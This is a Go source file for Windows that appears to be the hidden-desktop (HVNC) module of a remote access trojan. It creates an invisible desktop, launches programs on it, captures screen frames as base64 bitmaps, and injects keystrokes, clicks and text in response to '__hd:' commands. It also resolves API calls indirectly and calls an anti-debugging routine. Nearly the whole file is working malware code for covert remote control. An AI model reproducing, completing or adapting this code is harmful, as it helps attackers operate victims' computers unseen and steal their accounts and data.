//go:build windows

package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var hdName = func() string {
	n := uint32(time.Now().UnixNano())
	return fmt.Sprintf("d%08x", n)
}()

const (
	hdGenericAll          = 0x10000000
	hdSrcCopy             = 0x00CC0020
	hdStartfUseShowWindow = 0x1
	hdSwShow              = 5
	hdCreateUnicodeEnv    = 0x400
	hdKeyUp               = 0x2
	hdMouseMove           = 0x0001
	hdMouseLeftDown       = 0x0002
	hdMouseLeftUp         = 0x0004
	hdMouseRightDown      = 0x0008
	hdMouseRightUp        = 0x0010
	hdMouseAbsolute       = 0x8000
)

type hdStartupInfo struct {
	cb            uint32
	_             uint32
	reserved      *uint16
	desktop       *uint16
	title         *uint16
	x             uint32
	y             uint32
	xSize         uint32
	ySize         uint32
	xCountChars   uint32
	yCountChars   uint32
	fillAttribute uint32
	flags         uint32
	showWindow    uint16
	cbReserved2   uint16
	_pad          uint32
	lpReserved2   *byte
	stdInput      syscall.Handle
	stdOutput     syscall.Handle
	stdError      syscall.Handle
}

type hdProcessInfo struct {
	process syscall.Handle
	thread  syscall.Handle
	pid     uint32
	tid     uint32
}

type hdBitmapInfoHeader struct {
	size         uint32
	width        int32
	height       int32
	planes       uint16
	bitCount     uint16
	compression  uint32
	sizeImage    uint32
	xppm         int32
	yppm         int32
	clrUsed      uint32
	clrImportant uint32
}

var hdDesktop syscall.Handle

func nativeUser() string {
	var n uint32 = 256
	buf := make([]uint16, n)
	r, _, _ := syscall.SyscallN(getProc(mAdvapi32, fGetUserNameW),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)),
	)
	if r == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

func handleHiddenDesktop(cmd string) string {
	if !hdIsHost {
		return hdViaHost(cmd)
	}
	rest := strings.TrimPrefix(cmd, "__hd:")
	action, arg, _ := strings.Cut(strings.TrimSpace(rest), " ")
	action = strings.TrimSpace(action)
	arg = strings.TrimSpace(arg)
	switch action {
	case "", "start":
		return hdStart(arg)
	case "frame":
		return hdFrame()
	case "key":
		vk, _ := strconv.Atoi(arg)
		if vk == 0 {
			vk = 13
		}
		return hdKey(vk)
	case "click":
		return hdClick(arg, false)
	case "rclick":
		return hdClick(arg, true)
	case "type":
		return hdType(arg)
	case "stop":
		return hdStop()
	default:
		return "unknown desktop action"
	}
}

func hdEnsure() error {
	if hdDesktop != 0 {
		return nil
	}
	name, err := syscall.UTF16PtrFromString(hdName)
	if err != nil {
		return err
	}
	r, _, callErr := syscall.SyscallN(getProc(mUser32, fCreateDesktopW), uintptr(unsafe.Pointer(name)), 0, 0, 0, hdGenericAll, 0)
	if r == 0 {
		r, _, callErr = syscall.SyscallN(getProc(mUser32, fOpenDesktopW), uintptr(unsafe.Pointer(name)), 0, 0, hdGenericAll)
		if r == 0 {
			return callErr
		}
	}
	hdDesktop = syscall.Handle(r)
	return nil
}

func hdSpawn(exe string) uint32 {
	desktop, _ := syscall.UTF16PtrFromString(`WinSta0\` + hdName)
	cmd, err := syscall.UTF16FromString(exe)
	if err != nil {
		return 0
	}
	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Desktop = desktop
	si.Flags = hdStartfUseShowWindow
	si.ShowWindow = 3
	var pi syscall.ProcessInformation
	ok, _, _ := syscall.SyscallN(getProc(mKernel32, fCreateProcessW), 0, uintptr(unsafe.Pointer(&cmd[0])), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	runtime.KeepAlive(cmd)
	runtime.KeepAlive(desktop)
	if ok == 0 {
		return 0
	}
	syscall.SyscallN(rpCloseHandle, uintptr(pi.Process))
	syscall.SyscallN(rpCloseHandle, uintptr(pi.Thread))
	return pi.ProcessId
}

var hdStarted bool
var hdOwnHWND uintptr
var hdWndCB = syscall.NewCallback(func(hwnd, msg, wp, lp uintptr) uintptr {
	r, _, _ := syscall.SyscallN(getProc(mUser32, fDefWindowProcW), hwnd, msg, wp, lp)
	return r
})

func hdMakeWindow() {
	class, _ := syscall.UTF16PtrFromString("HdView")
	title, _ := syscall.UTF16PtrFromString("Desktop")
	type wndClass struct {
		style      uint32
		proc       uintptr
		clsExtra   int32
		wndExtra   int32
		instance   syscall.Handle
		icon       syscall.Handle
		cursor     syscall.Handle
		background syscall.Handle
		menu       *uint16
		class      *uint16
	}
	wc := wndClass{proc: hdWndCB, class: class}
	syscall.SyscallN(getProc(mUser32, fRegisterClassW), uintptr(unsafe.Pointer(&wc)))
	hwnd, _, _ := syscall.SyscallN(getProc(mUser32, fCreateWindowExW), 0, uintptr(unsafe.Pointer(class)), uintptr(unsafe.Pointer(title)), 0x10000000|0x00CF0000, 40, 40, 900, 600, 0, 0, 0, 0)
	if hwnd != 0 {
		hdOwnHWND = hwnd
		syscall.SyscallN(getProc(mUser32, fShowWindow), hwnd, 5)
		hdc, _, _ := syscall.SyscallN(getProc(mUser32, fGetDC), hwnd)
		if hdc != 0 {
			brush, _, _ := syscall.SyscallN(getProc(mGdi32, fCreateSolidBrush), 0x00FFFFFF)
			box := struct{ left, top, right, bottom int32 }{0, 0, 900, 600}
			syscall.SyscallN(getProc(mUser32, fFillRect), hdc, uintptr(unsafe.Pointer(&box)), brush)
			syscall.SyscallN(getProc(mGdi32, fDeleteObject), brush)
			syscall.SyscallN(getProc(mUser32, fReleaseDC), hwnd, hdc)
		}
	}
	runtime.KeepAlive(class)
	runtime.KeepAlive(title)
}

func hdStart(exe string) string {
	if hdStarted {
		return "desktop already started"
	}
	return hdOnDesktop(func() string {
		hdMakeWindow()
		hdStarted = true
		if hdOwnHWND == 0 {
			return "desktop window failed"
		}
		return "desktop started"
	})
}

func hdFrame() string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	ch := make(chan string, 1)
	go func() {
		defer func() {
			if rec := recover(); rec != nil {
				ch <- fmt.Sprintf("desktop error: %v", rec)
			}
		}()
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		ch <- hdCapture()
	}()
	select {
	case out := <-ch:
		return out
	case <-time.After(3 * time.Second):
		return "frame timed out"
	}
}

var hdWins []uintptr

func hdEnumProc(hwnd, lparam uintptr) uintptr {
	vis, _, _ := syscall.SyscallN(getProc(mUser32, fIsWindowVisible), hwnd)
	if vis != 0 && len(hdWins) < 32 {
		hdWins = append(hdWins, hwnd)
	}
	return 1
}

var hdEnumCB = syscall.NewCallback(hdEnumProc)

func hdPaintWindows(dst uintptr, sw, sh, dw, dh int) {
	if sw < 1 || sh < 1 {
		return
	}
	hdWins = nil
	syscall.SyscallN(getProc(mUser32, fEnumWindows), hdEnumCB, 0)
	for i := len(hdWins) - 1; i >= 0; i-- {
		hwnd := hdWins[i]
		var rc struct{ left, top, right, bottom int32 }
		syscall.SyscallN(getProc(mUser32, fGetWindowRect), hwnd, uintptr(unsafe.Pointer(&rc)))
		ww := int(rc.right - rc.left)
		wh := int(rc.bottom - rc.top)
		if ww < 8 || wh < 8 {
			continue
		}
		src, _, _ := syscall.SyscallN(getProc(mUser32, fGetWindowDC), hwnd)
		if src == 0 {
			continue
		}
		tmp, _, _ := syscall.SyscallN(getProc(mGdi32, fCreateCompatibleDC), src)
		bits, _, _ := syscall.SyscallN(getProc(mGdi32, fCreateCompatibleBitmap), src, uintptr(ww), uintptr(wh))
		old, _, _ := syscall.SyscallN(getProc(mGdi32, fSelectObject), tmp, bits)
		syscall.SyscallN(getProc(mUser32, fPrintWindow), hwnd, tmp, 2)
		syscall.SyscallN(getProc(mGdi32, fStretchBlt), tmp, 0, 0, uintptr(ww), uintptr(wh), src, 0, 0, uintptr(ww), uintptr(wh), hdSrcCopy)
		x := int(rc.left) * dw / sw
		y := int(rc.top) * dh / sh
		pw := ww * dw / sw
		ph := wh * dh / sh
		if pw > 0 && ph > 0 {
			syscall.SyscallN(getProc(mGdi32, fStretchBlt), dst, uintptr(x), uintptr(y), uintptr(pw), uintptr(ph), tmp, 0, 0, uintptr(ww), uintptr(wh), hdSrcCopy)
		}
		syscall.SyscallN(getProc(mGdi32, fSelectObject), tmp, old)
		syscall.SyscallN(getProc(mGdi32, fDeleteObject), bits)
		syscall.SyscallN(getProc(mGdi32, fDeleteDC), tmp)
		syscall.SyscallN(getProc(mUser32, fReleaseDC), hwnd, src)
	}
}

func hdCapture() string {
	syscall.SyscallN(getProc(mUser32, fSetThreadDesktop), uintptr(hdDesktop))
	hdc, _, _ := syscall.SyscallN(getProc(mUser32, fGetDC), 0)
	if hdc == 0 {
		return "no desktop dc"
	}
	defer syscall.SyscallN(getProc(mUser32, fReleaseDC), 0, hdc)
	sw, _, _ := syscall.SyscallN(getProc(mUser32, fGetSystemMetrics), 0)
	sh, _, _ := syscall.SyscallN(getProc(mUser32, fGetSystemMetrics), 1)
	if sw == 0 || sh == 0 {
		sw, sh = 1024, 768
	}
	dw, dh := int(sw), int(sh)
	if dw > 480 {
		dh = dh * 480 / dw
		dw = 480
	}
	if dh < 1 {
		dh = 1
	}
	memDC, _, _ := syscall.SyscallN(getProc(mGdi32, fCreateCompatibleDC), hdc)
	if memDC == 0 {
		return "compatible dc failed"
	}
	defer syscall.SyscallN(getProc(mGdi32, fDeleteDC), memDC)
	bmp, _, _ := syscall.SyscallN(getProc(mGdi32, fCreateCompatibleBitmap), hdc, uintptr(dw), uintptr(dh))
	if bmp == 0 {
		return "bitmap failed"
	}
	defer syscall.SyscallN(getProc(mGdi32, fDeleteObject), bmp)
	old, _, _ := syscall.SyscallN(getProc(mGdi32, fSelectObject), memDC, bmp)
	brush, _, _ := syscall.SyscallN(getProc(mGdi32, fCreateSolidBrush), 0x00462814)
	rect := struct{ left, top, right, bottom int32 }{0, 0, int32(dw), int32(dh)}
	syscall.SyscallN(getProc(mUser32, fFillRect), memDC, uintptr(unsafe.Pointer(&rect)), brush)
	syscall.SyscallN(getProc(mGdi32, fDeleteObject), brush)
	if hdOwnHWND != 0 {
		wdc, _, _ := syscall.SyscallN(getProc(mUser32, fGetDC), hdOwnHWND)
		if wdc != 0 {
			syscall.SyscallN(getProc(mGdi32, fStretchBlt), memDC, 8, 8, uintptr(dw-16), uintptr(dh/2), wdc, 0, 0, 900, 600, hdSrcCopy)
			syscall.SyscallN(getProc(mUser32, fReleaseDC), hdOwnHWND, wdc)
		}
	}
	hdPaintWindows(memDC, int(sw), int(sh), dw, dh)
	syscall.SyscallN(getProc(mGdi32, fSelectObject), memDC, old)
	stride := ((dw*3 + 3) / 4) * 4
	pixels := make([]byte, stride*dh)
	bi := hdBitmapInfoHeader{
		size:     40,
		width:    int32(dw),
		height:   int32(dh),
		planes:   1,
		bitCount: 24,
	}
	syscall.SyscallN(getProc(mGdi32, fGetDIBits), memDC, bmp, 0, uintptr(dh), uintptr(unsafe.Pointer(&pixels[0])), uintptr(unsafe.Pointer(&bi)), 0)
	file := make([]byte, 54+len(pixels))
	copy(file[0:2], "BM")
	binary.LittleEndian.PutUint32(file[2:], uint32(len(file)))
	binary.LittleEndian.PutUint32(file[10:], 54)
	binary.LittleEndian.PutUint32(file[14:], 40)
	binary.LittleEndian.PutUint32(file[18:], uint32(dw))
	binary.LittleEndian.PutUint32(file[22:], uint32(dh))
	binary.LittleEndian.PutUint16(file[26:], 1)
	binary.LittleEndian.PutUint16(file[28:], 24)
	copy(file[54:], pixels)
	img := fmt.Sprintf("HDIMG:%d,%d:", dw, dh) + base64.StdEncoding.EncodeToString(file)
	os.WriteFile(hdFilePath(), []byte(img), 0644)
	return img
}

func hdKey(vk int) string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	done := make(chan string, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		if r, _, err := syscall.SyscallN(getProc(mUser32, fSetThreadDesktop), uintptr(hdDesktop)); r == 0 {
			done <- "set desktop failed: " + err.Error()
			return
		}
		syscall.SyscallN(getProc(mUser32, fKeybdEvent), uintptr(vk), 0, 0, 0)
		syscall.SyscallN(getProc(mUser32, fKeybdEvent), uintptr(vk), 0, hdKeyUp, 0)
		done <- fmt.Sprintf("key %d", vk)
	}()
	return <-done
}

func hdOnDesktop(fn func() string) string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	done := make(chan string, 1)
	go func() {
		defer func() {
			if rec := recover(); rec != nil {
				done <- fmt.Sprintf("desktop error: %v", rec)
			}
		}()
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		clearDebugRegisters()
		if r, _, err := syscall.SyscallN(getProc(mUser32, fSetThreadDesktop), uintptr(hdDesktop)); r == 0 {
			done <- "set desktop failed: " + err.Error()
			return
		}
		done <- fn()
	}()
	return <-done
}

func hdClick(arg string, right bool) string {
	fields := strings.Fields(arg)
	if len(fields) < 2 {
		return "click needs x y"
	}
	x, errX := strconv.Atoi(fields[0])
	y, errY := strconv.Atoi(fields[1])
	if errX != nil || errY != nil {
		return "click needs x y"
	}
	return hdOnDesktop(func() string {
		if hdOwnHWND == 0 {
			hdMakeWindow()
		}
		if hdOwnHWND == 0 {
			return "click missed"
		}
		down := uintptr(0x0201)
		up := uintptr(0x0202)
		if right {
			down = 0x0204
			up = 0x0205
		}
		lp := uintptr(uint32(uint16(x)) | uint32(uint16(y))<<16)
		syscall.SyscallN(getProc(mUser32, fPostMessageW), hdOwnHWND, down, 0, lp)
		syscall.SyscallN(getProc(mUser32, fPostMessageW), hdOwnHWND, up, 0, lp)
		cls := make([]byte, 32)
		syscall.SyscallN(getProc(mUser32, fGetClassNameA), hdOwnHWND, uintptr(unsafe.Pointer(&cls[0])), 32)
		n := 0
		for n < len(cls) && cls[n] != 0 {
			n++
		}
		return fmt.Sprintf("click %d %d %s", x, y, string(cls[:n]))
	})
}

func hdType(text string) string {
	if text == "" {
		return "type needs text"
	}
	return hdOnDesktop(func() string {
		for _, r := range text {
			hdTypeRune(r)
		}
		return fmt.Sprintf("typed %d", len([]rune(text)))
	})
}

func hdTypeRune(r rune) {
	if r == '\n' || r == '\r' {
		syscall.SyscallN(getProc(mUser32, fKeybdEvent), 13, 0, 0, 0)
		syscall.SyscallN(getProc(mUser32, fKeybdEvent), 13, 0, hdKeyUp, 0)
		return
	}
	vkPair, _, _ := syscall.SyscallN(getProc(mUser32, fVkKeyScanW), uintptr(r))
	vk := byte(vkPair)
	if vk == 0xFF {
		return
	}
	shift := (vkPair >> 8) & 1
	if shift != 0 {
		syscall.SyscallN(getProc(mUser32, fKeybdEvent), 0x10, 0, 0, 0)
	}
	syscall.SyscallN(getProc(mUser32, fKeybdEvent), uintptr(vk), 0, 0, 0)
	syscall.SyscallN(getProc(mUser32, fKeybdEvent), uintptr(vk), 0, hdKeyUp, 0)
	if shift != 0 {
		syscall.SyscallN(getProc(mUser32, fKeybdEvent), 0x10, 0, hdKeyUp, 0)
	}
}

func hdStop() string {
	if hdDesktop != 0 {
		syscall.SyscallN(getProc(mUser32, fCloseDesktop), uintptr(hdDesktop))
		hdDesktop = 0
	}
	return "desktop stopped"
}
